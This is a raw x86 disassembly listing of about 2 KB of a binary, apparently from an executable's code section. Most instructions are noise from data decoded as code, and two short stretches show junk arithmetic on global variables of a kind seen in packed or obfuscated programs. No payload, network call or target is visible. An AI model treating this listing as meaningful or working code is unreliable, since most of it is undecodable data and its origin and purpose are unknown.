  40980f:	mov    al,ds:0x48eff9ef
  409814:	mul    BYTE PTR [ecx]
  409816:	arpl   WORD PTR [bp+si],cx
  409819:	push   0x94b6b5b5
  40981e:	xchg   ebp,eax
  40981f:	sbb    dl,dl
  409821:	loope  0x40980f
  409823:	mov    ebp,0x20be952e
  409828:	and    cl,BYTE PTR [edi+0x70468c77]
  40982e:	dec    eax
  40982f:	loop   0x4097b1
  409831:	retf   
  409832:	and    eax,0x1317e23f
  409837:	xor    BYTE PTR [ebp-0x2382a0e3],dh
  40983d:	ds and eax,0x6208429a
  409843:	ja     0x409812
  409845:	xchg   ebp,eax
  409846:	pop    es
  409847:	scas   al,BYTE PTR es:[edi]
  409848:	mov    bh,0x33
  40984a:	cwde   
  40984b:	js     0x40984d
  40984d:	cmp    al,0x8d
  40984f:	aaa    
  409850:	or     DWORD PTR [edx],ecx
  409852:	and    dl,BYTE PTR [edi+eax*2+0x57e248f9]
  409859:	popa   
  40985a:	daa    
  40985b:	mov    ds,edx
  40985d:	pop    edi
  40985e:	and    DWORD PTR [edi-0x7b],ebx
  409861:	xchg   ebx,eax
  409862:	add    eax,0x1c839a36
  409867:	cmp    ch,bl
  409869:	shl    DWORD PTR [esi],1
  40986b:	adc    esp,DWORD PTR [ebx-0x5d]
  40986e:	fist   WORD PTR [ecx]
  409870:	fucomip st,st(2)
  409872:	mov    al,0xcf
  409874:	push   eax
  409875:	and    ah,BYTE PTR [edx-0x61e4e818]
  40987b:	pop    ebp
  40987c:	es pop ebp
  40987e:	and    BYTE PTR [eax],0x63
  409881:	ds mov ebx,0x49895052
  409887:	xor    edx,DWORD PTR [edi]
  409889:	xor    eax,0xcf6d828e
  40988e:	inc    edx
  40988f:	and    BYTE PTR [esi-0x4c],dl
  409892:	loopne 0x4098b9
  409894:	loop   0x409856
  409896:	call   0x7ae6:0xe8081ac6
  40989d:	shr    DWORD PTR [ebp+edx*2-0xee5b0e],0x50
  4098a5:	adc    BYTE PTR [ecx],0xb1
  4098a8:	and    DWORD PTR [edi+0xb65f96f],esi
  4098ae:	cmp    bh,ch
  4098b0:	scas   eax,DWORD PTR es:[edi]
  4098b1:	jl     0x4098db
  4098b3:	or     al,0x5a
  4098b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b6:	sbb    ebp,0x6db522ea
  4098bc:	shr    DWORD PTR [ecx],1
  4098be:	jns    0x409854
  4098c0:	rcr    DWORD PTR [ecx+eiz*1-0x65],cl
  4098c4:	inc    eax
  4098c5:	call   0xd5ab8c69
  4098ca:	pusha  
  4098cb:	leave  
  4098cc:	sbb    ah,BYTE PTR [ebx-0x5e]
  4098cf:	mov    esp,0xe8574183
  4098d4:	pop    ebx
  4098d5:	inc    ecx
  4098d6:	jmp    0xb98b:0xeac78aeb
  4098dd:	dec    ecx
  4098de:	push   esi
  4098df:	add    BYTE PTR [edi+0x7e718fb8],dl
  4098e5:	(bad)  
  4098e6:	xor    esi,DWORD PTR [ebp+0x50]
  4098e9:	retf   0x5acb
  4098ec:	stos   BYTE PTR es:[edi],al
  4098ed:	mov    ch,0x3a
  4098ef:	dec    ebp
  4098f0:	arpl   WORD PTR [edi+0x2c],bx
  4098f3:	sti    
  4098f4:	nop    eax
  4098f7:	sbb    BYTE PTR [edi-0x6e],0x5c
  4098fb:	dec    ecx
  4098fc:	icebp  
  4098fd:	out    0x32,eax
  4098ff:	sbb    eax,0x4fed0d6f
  409904:	mov    ebx,0xdb0e9fea
  409909:	fnsave [ebx-0x52]
  40990c:	or     cl,al
  40990e:	add    al,0xce
  409910:	dec    esp
  409911:	xchg   ebp,eax
  409912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409913:	es ins BYTE PTR es:[edi],dx
  409915:	mov    ds:0xe212e6ec,eax
  40991a:	mov    eax,0xa1d8809e
  40991f:	popf   
  409920:	mov    esp,0x4bfcbde8
  409925:	pusha  
  409926:	fistp  DWORD PTR [edi+0x2]
  409929:	pop    ebx
  40992a:	push   ss
  40992b:	outs   dx,DWORD PTR ds:[esi]
  40992c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40992d:	ss or  al,0x34
  409930:	push   esi
  409931:	adc    al,BYTE PTR [ebx-0x587456cf]
  409937:	in     eax,0x40
  409939:	aas    
  40993a:	or     eax,0x99a188bc
  40993f:	pop    eax
  409940:	lods   eax,DWORD PTR ds:[esi]
  409941:	xor    al,0x6b
  409943:	xor    eax,0x76fc7d9d
  409948:	inc    ebx
  409949:	js     0x409980
  40994b:	sub    DWORD PTR [ebx+ecx*2-0x33],esi
  40994f:	lock adc edi,DWORD PTR [ebx]
  409952:	ja     0x40990d
  409954:	(bad)  
  409955:	ss xchg esi,eax
  409957:	push   edi
  409958:	ds (bad) 
  40995a:	outs   dx,BYTE PTR ds:[esi]
  40995b:	mov    dh,0x1d
  40995d:	add    eax,0xb4eebee0
  409962:	jb     0x409962
  409964:	fwait
  409965:	xchg   ecx,eax
  409966:	and    DWORD PTR [ebp-0x9],ecx
  409969:	mov    cl,0x2a
  40996b:	dec    ebx
  40996c:	sub    cl,bh
  40996e:	cmp    ebx,DWORD PTR [esi]
  409970:	scas   al,BYTE PTR es:[edi]
  409971:	popf   
  409972:	and    al,0x90
  409974:	js     0x4099cf
  409976:	iret   
  409977:	ja     0x40990d
  409979:	frstor [esi]
  40997b:	push   edi
  40997c:	rcr    DWORD PTR [ebp-0x2a074df9],cl
  409982:	pop    ss
  409983:	mov    bl,0x74
  409985:	jmp    0xff51:0x69aa803e
  40998c:	test   DWORD PTR ds:0x1d49bd63,esi
  409992:	inc    ebp
  409993:	sbb    BYTE PTR [edi-0x29c7b3fd],dl
  409999:	mov    dl,0x89
  40999b:	repz in eax,dx
  40999d:	mov    eax,0x5c3cdc7
  4099a2:	je     0x409a02
  4099a4:	push   eax
  4099a5:	(bad)  
  4099a6:	into   
  4099a7:	std    
  4099a8:	xlat   BYTE PTR ds:[ebx]
  4099a9:	imul   edx,DWORD PTR [edi+eiz*1],0x15
  4099ad:	and    BYTE PTR [ebp-0x37],dh
  4099b0:	jae    0x409a01
  4099b2:	xor    al,0x8a
  4099b4:	neg    DWORD PTR ds:0xaafc9c13
  4099ba:	ja     0x4099e6
  4099bc:	scas   eax,DWORD PTR es:[edi]
  4099bd:	scas   al,BYTE PTR es:[edi]
  4099be:	ins    DWORD PTR es:[edi],dx
  4099bf:	sar    BYTE PTR [ebp-0x5122aa47],cl
  4099c5:	push   ecx
  4099c6:	mov    DWORD PTR ds:0x42a875,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx-0xd13eb31]
  409a19:	les    edi,FWORD PTR [ecx]
  409a1b:	in     eax,0xb6
  409a1d:	idiv   DWORD PTR [eax+0x78]
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099b0
  409a25:	sub    DWORD PTR [edx-0x49],esp
  409a28:	int3   
  409a29:	jge    0x4099df
  409a2b:	retf   0x22dd
  409a2e:	mov    bh,0xdd
  409a30:	mov    cl,0x23
  409a32:	icebp  
  409a33:	inc    eax
  409a34:	or     ecx,DWORD PTR [bx+di]
  409a37:	jno    0x4099fd
  409a39:	dec    ebx
  409a3a:	xor    eax,0x2330a8e9
  409a3f:	add    esi,edx
  409a41:	lea    esi,[ecx+0x67]
  409a44:	mov    cl,0x4
  409a46:	push   ebp
  409a47:	xor    eax,0x605e123f
  409a4c:	cmp    esp,DWORD PTR [ebx]
  409a4e:	mov    eax,0xd447bdf
  409a53:	mov    ebx,0x2c71068c
  409a58:	mov    esp,0x4437d999
  409a5d:	fld    TBYTE PTR [ecx+0x2b]
  409a60:	xor    ch,0x45
  409a63:	dec    ecx
  409a64:	bound  ecx,QWORD PTR [ecx-0x46039234]
  409a6a:	xchg   ecx,eax
  409a6b:	sbb    cl,BYTE PTR [esi+0x4f16821e]
  409a71:	xor    BYTE PTR [ebp-0x38],al
  409a74:	test   DWORD PTR [esp+eax*1-0x4a5f6442],ebx
  409a7b:	test   BYTE PTR [eax+0x67b47659],cl
  409a81:	in     eax,0x26
  409a83:	aas    
  409a84:	lods   al,BYTE PTR ds:[esi]
  409a85:	and    esp,DWORD PTR [edi-0x41]
  409a88:	mov    ebp,0xa0e0ea3c
  409a8d:	(bad)  
  409a8e:	fs mov ah,0x63
  409a91:	push   ebx
  409a92:	data16 clc 
  409a94:	mov    dh,0x91
  409a96:	aam    0x39
  409a98:	cmp    edx,DWORD PTR gs:[edi]
  409a9b:	push   ebx
  409a9c:	fst    DWORD PTR [esi-0x7a]
  409a9f:	or     ebx,DWORD PTR [edi-0x73]
  409aa2:	jne    0x409a3d
  409aa4:	jg     0x409b11
  409aa6:	aad    0xf7
  409aa8:	jnp    0x409a94
  409aaa:	add    bl,ah
  409aac:	adc    dh,cl
  409aae:	and    DWORD PTR [edx-0x66],ebp
  409ab1:	fisubr DWORD PTR [eax]
  409ab3:	push   esp
  409ab4:	in     eax,0xe2
  409ab6:	gs in  eax,0xa8
  409ab9:	add    DWORD PTR [edx+edi*8-0x364b3dec],0xffffffbc
  409ac1:	and    al,0x7
  409ac3:	stos   DWORD PTR es:[edi],eax
  409ac4:	jmp    0xf3f45715
  409ac9:	jno    0x409aa5
  409acb:	(bad)  
  409acc:	adc    cl,BYTE PTR [ecx]
  409ace:	and    eax,0x4172d284
  409ad3:	jmp    0x409b29
  409ad5:	ins    DWORD PTR es:[edi],dx
  409ad6:	sar    DWORD PTR [eax+0x5cb52770],cl
  409adc:	mov    edi,0x5c99f44c
  409ae1:	aad    0x19
  409ae3:	xchg   ebp,eax
  409ae4:	jnp    0x409b4d
  409ae6:	push   es
  409ae7:	popf   
  409ae8:	mov    ah,0xa9
  409aea:	cmp    al,0x31
  409aec:	or     esi,DWORD PTR [ebp-0x46215676]
  409af2:	rcl    BYTE PTR [ebx+0x3bfab656],1
  409af8:	pusha  
  409af9:	scas   al,BYTE PTR es:[edi]
  409afa:	inc    ecx
  409afb:	push   esp
  409afc:	fsubr  DWORD PTR [edi]
  409afe:	xchg   DWORD PTR [esi],esp
  409b00:	mov    ecx,0xa08c1c27
  409b05:	sbb    BYTE PTR [ebx-0x7c],0xd7
  409b09:	in     eax,0x16
  409b0b:	mov    esp,0x234f6e20
  409b10:	add    ebp,ebp
  409b12:	jge    0x409a9e
  409b14:	int3   
  409b15:	inc    edi
  409b16:	ficom  WORD PTR [eax-0x13]
  409b19:	gs push es
  409b1b:	sub    eax,DWORD PTR [ebp-0x40582cd4]
  409b21:	arpl   WORD PTR [ebp-0x58],di
  409b24:	sub    DWORD PTR [edi+0x53779bc],edx
  409b2a:	out    dx,al
  409b2b:	in     al,dx
  409b2c:	xchg   DWORD PTR [ebx+0x13329f17],esi
  409b32:	inc    edi
  409b33:	fistp  DWORD PTR [edx]
  409b35:	mov    ah,0xd0
  409b37:	jnp    0x409b48
  409b39:	mov    esi,0xa3d5f6b2
  409b3e:	sbb    edx,esi
  409b40:	(bad)  
  409b41:	out    0x1d,eax
  409b43:	les    edx,FWORD PTR [edi]
  409b45:	(bad)  [ecx+0x35]
  409b48:	xchg   edi,eax
  409b49:	inc    ebx
  409b4a:	mov    dl,0xf0
  409b4c:	nop
  409b4d:	clc    
  409b4e:	test   ebp,edx
  409b50:	rcl    bh,0xab
  409b53:	cmp    eax,0xa35b0e49
  409b58:	sbb    bh,BYTE PTR [edi]
  409b5a:	je     0x409aea
  409b5c:	lahf   
  409b5d:	jp     0x409b47
  409b5f:	inc    ecx
  409b60:	or     DWORD PTR [esi],ebp
  409b62:	inc    ebx
  409b63:	xor    eax,DWORD PTR [edx+eiz*1-0x50]
  409b67:	(bad)  
  409b68:	ja     0x409b2f
  409b6a:	fs pop eax
  409b6c:	bound  edx,QWORD PTR [ecx+0x0]
  409b6f:	mov    edi,0x5a2b146e
  409b74:	pop    esi
  409b75:	xchg   edi,eax
  409b76:	enter  0xb535,0x93
  409b7a:	adc    al,0xfe
  409b7c:	mov    BYTE PTR ds:0x63197aac,dl
  409b83:	mov    cl,al
  409b85:	or     eax,0xe4079031
  409b8a:	jne    0x409b61
  409b8c:	aam    0x3c
  409b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b8f:	loopne 0x409c0f
  409b91:	dec    esp
  409b92:	lds    edi,FWORD PTR [edx-0x50]
  409b95:	call   0x2301f5ba
  409b9a:	jmp    0x11e7e14d
  409b9f:	in     al,dx
  409ba0:	pusha  
  409ba1:	mov    ebx,fs
  409ba3:	scas   al,BYTE PTR es:[edi]
  409ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba5:	(bad)  
  409ba6:	push   edx
  409ba7:	daa    
  409ba8:	xchg   ebx,eax
  409ba9:	(bad)  
  409baa:	out    dx,eax
  409bab:	pop    ebx
  409bac:	repnz and eax,0x4855ce1
  409bb2:	mov    esi,0xc8a843db
  409bb7:	aas    
  409bb8:	call   0xae2fee44
  409bbd:	gs pop ss
  409bbf:	aaa    
  409bc0:	mov    dl,0xbf
  409bc2:	jge    0x409bc8
  409bc4:	das    
  409bc5:	out    dx,eax
  409bc6:	(bad)  
  409bc7:	loop   0x409b56
  409bc9:	aaa    
  409bca:	sub    eax,0x35fb0f25
  409bcf:	ins    DWORD PTR es:[edi],dx
  409bd0:	dec    esp
  409bd1:	jp     0x409bde
  409bd3:	jl     0x409c2f
  409bd5:	pop    es
  409bd6:	inc    edx
  409bd7:	je     0x409c3f
  409bd9:	sbb    eax,0xc3d10f62
  409bde:	push   ecx
  409bdf:	test   al,0xa1
  409be1:	imul   edx,DWORD PTR [ebp+0x35],0x7b
  409be5:	call   0x8c10:0xcf728400
  409bec:	adc    al,BYTE PTR [ecx-0x12]
  409bef:	mov    al,0x65
  409bf1:	fidivr DWORD PTR [ecx]
  409bf3:	popa   
  409bf4:	adc    BYTE PTR [esi-0x53ec3c63],0x6c
  409bfb:	aam    0xe
  409bfd:	sub    BYTE PTR [edx+0x6f],ah
  409c00:	(bad)  
  409c01:	mov    esp,0xc9b94ffa
  409c06:	mov    eax,0x97ed5153
  409c0b:	inc    ecx
  409c0c:	sbb    bl,BYTE PTR [eax-0x52]
  409c0f:	jns    0x409c74
  409c11:	pop    edx
  409c12:	xchg   ebx,eax
  409c13:	addr16 pop ds
  409c15:	ins    BYTE PTR es:[edi],dx
  409c16:	ins    DWORD PTR es:[edi],dx
  409c17:	cmp    BYTE PTR [ebx+0x42785e8],ch
  409c1d:	dec    ebx
  409c1e:	add    eax,0x90149700
  409c23:	jns    0x409c8b
  409c25:	iret   
  409c26:	adc    BYTE PTR [ecx+0x6035f8d8],bh
  409c2c:	jl     0x409c14
  409c2e:	mov    eax,0xa7fc348d
  409c33:	out    0x4b,eax
  409c35:	inc    esp
  409c36:	dec    eax
  409c37:	jecxz  0x409c00
  409c39:	push   ss
  409c3a:	sar    BYTE PTR [edx+0x45],cl
  409c3d:	add    DWORD PTR [edi+0x4d15ebc4],ecx
  409c43:	mov    al,0xda
  409c45:	fld    QWORD PTR [esi+0x1f]
  409c48:	and    al,0x21
  409c4a:	sub    edi,DWORD PTR [ecx+eax*1+0x39]
  409c4e:	jb     0x409c86
  409c50:	cmp    esi,esi
  409c52:	jle    0x409be4
  409c54:	jmp    0x676:0xf74dc1e3
  409c5b:	in     al,dx
  409c5c:	(bad)  
  409c5d:	pop    ds
  409c5e:	ins    DWORD PTR es:[edi],dx
  409c5f:	pop    ecx
  409c60:	sbb    DWORD PTR [esi+0x7],esp
  409c63:	gs dec ebp
  409c65:	cmp    bh,dh
  409c67:	jmp    0x46e3ce9b
  409c6c:	jp     0x409c68
  409c6e:	pop    ss
  409c6f:	xchg   esi,eax
  409c70:	add    esp,esp
  409c72:	test   eax,0xc1fbf60a
  409c77:	neg    BYTE PTR [ebp-0x741b3aea]
  409c7d:	rol    DWORD PTR [edi],1
  409c7f:	loop   0x409c0a
  409c81:	xor    esi,DWORD PTR [ecx+0x3a]
  409c84:	cwde   
  409c85:	and    eax,0x8b221c2e
  409c8a:	fs inc edi
  409c8c:	pop    esi
  409c8d:	ins    BYTE PTR es:[edi],dx
  409c8e:	dec    ecx
  409c8f:	sbb    edx,DWORD PTR [edx]
  409c91:	cli    
  409c92:	jp     0x409c90
  409c94:	mov    BYTE PTR [ecx-0x7dd3a1fe],ch
  409c9a:	int3   
  409c9b:	in     al,0xd0
  409c9d:	mov    eax,0x802d3eb3
  409ca2:	mov    cl,0x3b
  409ca4:	stc    
  409ca5:	popf   
  409ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca7:	es clc 
  409ca9:	adc    esi,DWORD PTR [ecx+0x6b]
  409cac:	jb     0x409c57
  409cae:	in     eax,0x13
  409cb0:	jmp    0x409ca2
  409cb2:	pop    ecx
  409cb3:	pop    ecx
  409cb4:	jl     0x409d03
  409cb6:	iret   
  409cb7:	clc    
  409cb8:	pop    eax
  409cb9:	jns    0x409d08
  409cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbc:	xor    DWORD PTR [esi],ebx
  409cbe:	mov    ch,0x8f
  409cc0:	jmp    0xc3dcf873
  409cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cc6:	out    dx,eax
  409cc7:	lahf   
  409cc8:	imul   esi,ebp,0xff5fa8fd
  409cce:	call   0xfba8:0xf130be32
  409cd5:	xchg   ebx,eax
  409cd6:	pop    edx
  409cd7:	loop   0x409d13
  409cd9:	xchg   ebx,eax
  409cda:	daa    
  409cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cdc:	lods   al,BYTE PTR ds:[esi]
  409cdd:	xor    ah,ch
  409cdf:	call   0x45a8:0xfe4a9549
  409ce6:	cmp    dh,BYTE PTR [edx-0x54]
  409ce9:	rcl    DWORD PTR [ecx-0x3f],1
  409cec:	mov    ?,WORD PTR [esi-0x6135804d]
  409cf2:	retf   
  409cf3:	xchg   esi,eax
  409cf4:	inc    ebx
  409cf5:	cs hlt 
  409cf7:	lds    ecx,FWORD PTR [edi]
  409cf9:	pop    es
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x49a0b62f],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d54
  409d66:	adc    BYTE PTR [esi+0x5542b120],cl
  409d6c:	jmp    0x75b4b60e
  409d71:	push   ss
  409d72:	xor    eax,0xe09bc669
  409d77:	inc    eax
  409d78:	mov    dl,0x8f
  409d7a:	dec    esp
  409d7b:	shl    DWORD PTR [edx+0x7c],0x3e
  409d7f:	dec    ebp
  409d80:	mov    dl,0x79
  409d82:	pushf  
  409d83:	or     al,dh
  409d85:	sbb    DWORD PTR [ebp-0x373d4dee],ebx
  409d8b:	ror    DWORD PTR [edx-0x47],0xef
  409d8f:	add    eax,0xe3143b02
  409d94:	retf   0x6e3a
  409d97:	mov    bl,bh
  409d99:	jmp    0xac1f92db
  409d9e:	or     eax,0x8f840058
  409da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da4:	or     eax,0x99b64d98
  409da9:	fbstp  TBYTE PTR [edi+edx*2-0x76]
  409dad:	mov    eax,ds:0x6c678217
  409db2:	ss add esp,edx
  409db5:	lods   eax,DWORD PTR ds:[esi]
  409db6:	and    eax,0x7feabe6
  409dbb:	pop    ds
  409dbc:	jge    0x409e1e
  409dbe:	ds mov ebp,0x98e70b6b
  409dc4:	sbb    eax,0x8e8201c4
  409dc9:	test   eax,0x9baaa824
  409dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dcf:	je     0x409dba
  409dd1:	cmp    DWORD PTR [eax-0x68],edx
  409dd4:	adc    al,0xc8
  409dd6:	popa   
  409dd7:	imul   BYTE PTR [ebp-0x1e]
  409dda:	mov    eax,ds:0xab5cc046
  409ddf:	jno    0x409dcc
  409de1:	inc    edi
  409de2:	pop    ss
  409de3:	inc    eax
  409de4:	in     eax,dx
  409de5:	adc    al,0x3d
  409de7:	dec    edx
  409de8:	sar    BYTE PTR [eax],1
  409dea:	cmp    ah,bh
  409dec:	lds    esp,FWORD PTR fs:[esi]
  409def:	clc    
  409df0:	xlat   BYTE PTR ds:[ebx]
  409df1:	iret   
  409df2:	loope  0x409dc2
  409df4:	call   0xa97b:0xcedf598b
  409dfb:	xchg   BYTE PTR [eax+0x4d2475a0],dh
  409e01:	jnp    0x409d8c
  409e03:	dec    ebp
  409e04:	lea    ebx,[ecx]
  409e06:	in     eax,0x62
  409e08:	push   ebp
  409e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e0a:	int3   
  409e0b:	pop    es
  409e0c:	cmp    edx,ebp
  409e0e:	and    eax,DWORD PTR [edi+0x11373347]
  409e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e15:	inc    esi
  409e16:	sbb    cl,BYTE PTR [ecx]
  409e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e19:	sbb    DWORD PTR ds:0x6f301c47,edx
  409e1f:	pop    edi
  409e20:	xor    DWORD PTR [ebp+0x1e],edi
  409e23:	xchg   esi,eax
  409e24:	xor    esp,ebx
  409e26:	repnz xchg ebp,eax
  409e28:	rol    DWORD PTR [ebx],0x5b
  409e2b:	add    eax,0xfd698356
  409e30:	pop    es
  409e31:	jmp    0x172c3658
  409e36:	lea    ebx,[esi+0xe248f71]
  409e3c:	cmp    al,BYTE PTR [esi]
  409e3e:	dec    edi
  409e3f:	add    ecx,DWORD PTR [edx+0x2]
  409e42:	stos   BYTE PTR es:[edi],al
  409e43:	mov    gs,WORD PTR [edi*8+0x622c2cd7]
  409e4a:	mov    bh,0xc7
  409e4c:	loope  0x409e74
  409e4e:	stos   BYTE PTR es:[edi],al
  409e4f:	push   esp
  409e50:	inc    dl
  409e52:	add    DWORD PTR [ecx],0xf5b5790
  409e58:	je     0x409e8e
  409e5a:	pop    ds
  409e5b:	sbb    eax,0x91c4f7e7
  409e60:	push   ss
  409e61:	sub    DWORD PTR ds:0xe0e2e2c,0xfffffffa
  409e68:	cmp    BYTE PTR [edx],0x71
  409e6b:	push   ebp
  409e6c:	iret   
  409e6d:	in     al,0xc2
  409e6f:	popf   
  409e70:	inc    esp
  409e71:	jo     0x409e2d
  409e73:	bnd ja 0x409e9f
  409e76:	sbb    dl,BYTE PTR [edi+0x4df22b3d]
  409e7c:	sbb    al,0xe6
  409e7e:	jle    0x409e43
  409e80:	push   0x544dcb76
  409e85:	psrlw  mm3,QWORD PTR [ebx]
  409e88:	or     al,0x94
  409e8a:	and    dl,BYTE PTR [ebx]
  409e8c:	cli    
  409e8d:	andps  xmm5,XMMWORD PTR [ebp+esi*4-0x4a]
  409e92:	aaa    
  409e93:	imul   ebp,DWORD PTR [esi],0x6042c6ec
  409e99:	pop    ds
  409e9a:	imul   ebp,DWORD PTR [ecx+0x7e8d7218],0xffffffc8
  409ea1:	or     eax,0x53504041
  409ea6:	inc    dl
  409ea8:	pop    esi
  409ea9:	lock dec esi
  409eab:	in     eax,dx
  409eac:	stos   BYTE PTR es:[edi],al
  409ead:	fs push 0xdfb3560e
  409eb3:	mov    eax,0x85d2282
  409eb8:	push   ss
  409eb9:	ins    DWORD PTR es:[edi],dx
  409eba:	xchg   edx,eax
  409ebb:	(bad)  
  409ebc:	sbb    cl,dh
  409ebe:	sbb    dh,dl
  409ec0:	inc    esp
  409ec1:	ins    DWORD PTR es:[edi],dx
  409ec2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409ec4:	or     eax,0xa8e8ad4
  409ec9:	sub    eax,eax
  409ecb:	cs pusha 
  409ecd:	mov    ds:0xda516570,eax
  409ed2:	or     edx,DWORD PTR [ebx+0x72]
  409ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed6:	or     eax,0x9b35203b
  409edb:	std    
  409edc:	int    0x7f
  409ede:	std    
  409edf:	mov    al,ds:0xf3bdc1ef
  409ee4:	jbe    0x409f59
  409ee6:	jge    0x409f23
  409ee8:	out    0xa7,al
  409eea:	(bad)  
  409eeb:	jge    0x409e71
  409eed:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409eef:	xor    BYTE PTR [esi-0x711786e1],ah
  409ef5:	ror    edi,1
  409ef7:	js     0x409f0e
  409ef9:	push   ecx
  409efa:	push   ecx
  409efb:	xchg   esp,eax
  409efc:	sub    eax,0xe80945c7
  409f01:	retf   0x7963
  409f04:	out    0x4a,al
  409f06:	in     al,0x43
  409f08:	sbb    BYTE PTR [edx+0xa657557],ch
  409f0e:	cmc    
  409f0f:	inc    esp
  409f10:	lea    eax,[esi]
  409f12:	pop    eax
  409f13:	mov    dh,0xd4
  409f15:	lahf   
  409f16:	dec    eax
  409f17:	mov    ds:0x81072104,al
  409f1c:	and    eax,0xe9b7bc6d
  409f21:	jnp    0x409eff
  409f23:	add    ah,0xb5
  409f26:	jns    0x409ef1
  409f28:	dec    ebp
  409f29:	jmp    0x5c8f:0x6c782394
  409f30:	sub    al,0x24
  409f32:	mov    edi,0x671306b2
  409f37:	add    al,0x45
  409f39:	leave  
  409f3a:	inc    ebp
  409f3b:	xchg   al,ah
  409f3d:	in     al,0x77
  409f3f:	jge    0x409f7d
  409f41:	stos   BYTE PTR es:[edi],al
  409f42:	shr    DWORD PTR [bp+di-0x3f],1
  409f46:	xor    al,cl
  409f48:	dec    edi
  409f49:	inc    ebp
  409f4a:	push   ss
  409f4b:	mov    edx,0x90bb86ee
  409f50:	outs   dx,DWORD PTR ds:[esi]
  409f51:	xor    bl,BYTE PTR [ecx-0x53]
  409f54:	aam    0xab
  409f56:	loop   0x409f1b
  409f58:	pop    edx
  409f59:	mov    cl,0x75
  409f5b:	lahf   
  409f5c:	test   eax,0xac8effbe
  409f61:	fwait
  409f62:	hlt    
  409f63:	xchg   esi,eax
  409f64:	push   ds
  409f65:	test   BYTE PTR [ecx+0x6982bab0],0x44
  409f6c:	mov    ch,0x9a
  409f6e:	(bad)  
  409f6f:	nop
  409f70:	cs push cs
  409f72:	js     0x409f10
  409f74:	dec    eax
  409f75:	mov    edx,0x3a48ee35
  409f7a:	ror    DWORD PTR ds:0x9d1808a6,0xfa
  409f81:	mov    esi,0x89e3b68
  409f86:	or     eax,0x573c16e1
  409f8b:	sub    edi,DWORD PTR [ecx-0x76]
  409f8e:	inc    ebx
  409f8f:	push   ebx
  409f90:	inc    edx
  409f91:	lods   eax,DWORD PTR ds:[esi]
  409f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f93:	sbb    eax,0xa531ba5
  409f98:	mov    ebx,0xad0cdb06
  409f9d:	xor    DWORD PTR [ebp+0x23c651e0],0xc20a70ad
  409fa7:	fisttp QWORD PTR [ecx-0x3bdcc654]
  409fad:	push   cs
  409fae:	mov    dl,0x16
  409fb0:	outs   dx,DWORD PTR ds:[esi]
  409fb1:	iret   
  409fb2:	imul   ecx,DWORD PTR [edi+0x1d],0xe638f357
  409fb9:	pop    edx
  409fba:	aad    0xc3
  409fbc:	sbb    al,0x9e
  409fbe:	adc    DWORD PTR [edi-0x59],0x10
  409fc2:	mov    cl,0xe8
  409fc4:	dec    eax
  409fc5:	push   ebp
  409fc6:	inc    ebp
  409fc7:	mov    ah,0x16
  409fc9:	lods   eax,DWORD PTR ds:[esi]
  409fca:	into   
  409fcb:	aad    0x51
  409fcd:	gs mov bl,0x44
  409fd0:	fbstp  TBYTE PTR [eax+0x14]
  409fd3:	and    eax,0xa24f0aa6
  409fd8:	push   ecx
  409fd9:	(bad)  
  409fda:	push   ecx
  409fdb:	xor    al,0xd9
  409fdd:	lods   eax,DWORD PTR ds:[esi]
  409fde:	lds    eax,FWORD PTR [esi+0x54d9eeb9]
  409fe4:	in     al,0x4c
  409fe6:	mov    esp,0x9f399456
  409feb:	inc    edi
  409fec:	add    edi,ebx
  409fee:	jns    0x409fcf
  409ff0:	pop    edx
  409ff1:	out    0x4b,al
  409ff3:	or     eax,0x8962aa34
  409ff8:	xchg   edi,eax
